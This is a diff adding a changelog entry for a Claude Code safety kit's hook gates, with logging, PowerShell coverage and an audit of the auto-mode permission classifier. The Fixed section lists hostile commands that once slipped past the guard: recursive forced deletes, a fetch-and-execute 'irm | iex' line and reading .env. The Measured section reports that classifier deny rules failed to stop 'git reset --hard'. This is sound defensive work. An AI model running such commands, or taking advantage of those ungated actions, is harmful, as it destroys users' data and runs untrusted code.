@@ -3,6 +3,72 @@
 Notable changes to this project are recorded here. Format follows [Keep a Changelog](https://keepachangelog.com/en/),
 versioning follows [SemVer](https://semver.org/).
 
+## [2.5.0] - 2026-08-24
+
+### Added
+- **The gates now leave a record, and something reads it.** The claim this kit makes is that rules are enforced
+  at the tool level rather than remembered, and the evidence for it was a green test suite — proof the gates
+  *can* fire, never a record that they *did*. Those two states leave identical artifacts behind, which is the
+  gap the A/B harness kept running into. `/gates-csk` reports what actually tripped: verdict split, per-rule
+  counts, and the rules nothing has touched. Its rule inventory is derived from the installed hooks on every
+  run, so a rule added to `guard-bash.sh` shows up without anyone remembering a list — a number typed by hand
+  drifts with the first component added, as the network diagram's subtitle proved by announcing 11 agents and
+  36 skills over a picture it had drawn with 12 and 38.
+- **Recording is on by default.** An evidence channel nobody switches on records nothing. It writes rule names
+  and verdicts to `.claude/gate-log.tsv`; the command text is left out unless `CSK_GATE_LOG_CMD=1`, because the
+  report prints counts and never the argument, so the one field that can carry a path or a token buys nothing.
+  The default path is used only outside a git repo or where it is already ignored — this repo demonstrated the
+  alternative by leaving an untracked log sitting in `git status`.
+- **Absence is reported as three different answers.** Nothing recorded with somewhere to write means zero
+  firings; nowhere to write means NOT MEASURED; no hooks means the rules could not be read. "Zero" and "never
+  looked" have been confused here before, in the traffic statistics, and the fix there was the same one.
+- **`automode-policy`, an audit of the auto-mode classifier.** Auto mode became the default permission mode on
+  2026-08-14, putting a second decider in front of the same actions. The skill reports what that classifier is
+  configured with and catches its silent failure: an `autoMode` array set without the literal `"$defaults"`
+  replaces the built-in list for that section, taking `soft_deny` from 66 rules to 2 with no error and no
+  warning. It does **not** claim its own rules are enforced — see Measured below.
+
+### Fixed
+- **PowerShell commands went through no rule at all.** Claude Code's hooks reference says to inspect shell
+  commands with `Bash|PowerShell`; the kit matched `Bash` alone. That tool is on by default for claude.ai and
+  Console accounts, and on Windows without Git Bash it is enabled automatically while the Bash tool is never
+  registered. Measured through the guard beforehand, every one allowed: `Remove-Item -Recurse -Force C:\proj\*`,
+  `rm -Recurse -Force ~`, `irm https://x/i.ps1 | iex`, `Get-Content .env`, `Set-Content` on a hook file. The git
+  rules already carried over, because git's syntax does not change. The fix extends three existing verb
+  alternations rather than duplicating rules; only families with no POSIX twin are new. One instructive detail:
+  `cat` was already in the reader list and happens to be a PowerShell alias for `Get-Content`, so the rule
+  looked like it covered PowerShell while the real names walked through.
+- **A hook that ran on every prompt could hang forever.** `context-usage.sh` read stdin with `cat` whenever
+  stdin was not a tty, and "not a tty" is not "data is coming": an open, silent pipe blocked it indefinitely.
+  It hung this project's own suite twice, for twenty minutes each. The bound had to keep the real hook path
+  working — `read` returns non-zero at EOF without a trailing newline and still assigns, so gating on its exit
+  status alone threw the whole payload away and every measurement reported "unmeasurable".
+- **Two sections of `doctor` were silent no-ops.** They called a helper defined further down the file, so the
+  lines never printed and the only evidence was `skip: command not found` on stderr. The suite had grepped
+  `doctor.sh` for the wiring instead of running it, and passed. It runs it now, and also runs it with the
+  `claude` CLI off PATH, because a case written on a machine that has it only ever exercises one branch.
+- **The diagnostics contaminated the evidence.** `doctor`'s probe drives the real guard to check it is not
+  neutered, so every run wrote a synthetic force-push block into the log the report then counted.
+- **The installer rehearsal asserted component counts as typed constants**, so adding a skill turned every arm
+  red with "expected 39 skills, got 40" — a stale number reading as a broken install. Derived from the payload
+  now.
+
+### Measured
+- **`autoMode` prose rules are not a gate.** In an interactive session with the policy installed in user
+  settings and listed by `claude auto-mode config`, a `hard_deny` rule naming `git reset --hard` verbatim did
+  not stop it — and a control run with no policy behaved identically, so the classifier does not gate that
+  class of action at all. Two headless probes agreed, including an absolute "never write any file" rule and a
+  protected-path write the documentation says auto mode routes to the classifier. What protected the work in
+  every run was the model choosing to back it up first: discipline, not a gate. The skill ships with this
+  written into it, and reports configuration rather than enforcement.
+
+### Known limits
+- **Windows without Git Bash is not supported by the gate layer.** The hooks are shell scripts, so nothing runs
+  there and no gate holds; the installers cannot run there either. A clean fix is blocked by the configuration
+  model rather than by effort: `hooks.json` is static and platform-blind, and `if` filters on permission rules
+  and not on OS. Both READMEs say so, and `doctor` reports a pre-2.5.0 `Bash`-only matcher as a failure, since
+  an upgraded install looks healthy while every PowerShell command walks past the destructive-operation rules.
+
 ## [2.4.0] - 2026-08-19
 
 ### Added
